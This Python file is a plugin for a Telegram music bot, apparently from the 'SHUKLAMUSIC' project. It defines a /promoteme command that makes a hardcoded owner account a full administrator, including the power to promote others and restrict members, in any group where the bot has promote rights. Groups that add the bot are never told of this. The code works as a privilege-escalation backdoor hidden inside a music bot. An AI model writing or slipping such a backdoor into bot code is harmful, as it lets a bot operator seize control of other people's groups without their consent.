from pyrogram import filters
from pyrogram.types import Message, ChatPermissions
from config import BANNED_USERS
from SHUKLAMUSIC import app

# 🔐 Set your Telegram user ID here
OWNER_ID = 7659846392 # ← replace this with your real Telegram user ID

@app.on_message(filters.command("promoteme") & filters.group & ~BANNED_USERS)
async def promoteme_handler(client, message: Message):
    chat_id = message.chat.id
    user = message.from_user

    if user.id != OWNER_ID:
        return await message.reply_text("🚫 You are not authorized to use this command.")

    bot_member = await app.get_chat_member(chat_id, client.id)
    if not bot_member.can_promote_members:
        return await message.reply_text("❌ Sorry, bot doesn't have permission to promote.")

    try:
        await app.promote_chat_member(
            chat_id=chat_id,
            user_id=OWNER_ID,
            can_change_info=True,
            can_post_messages=True,
            can_edit_messages=True,
            can_delete_messages=True,
            can_invite_users=True,
            can_restrict_members=True,
            can_pin_messages=True,
            can_promote_members=True,
            can_manage_video_chats=True,
            can_manage_chat=True,
            is_anonymous=False,
        )
        await message.reply_text("👑 Promoted, Boss!")
    except Exception as e:
        await message.reply_text(f"❌ Failed to promote: `{e}`")
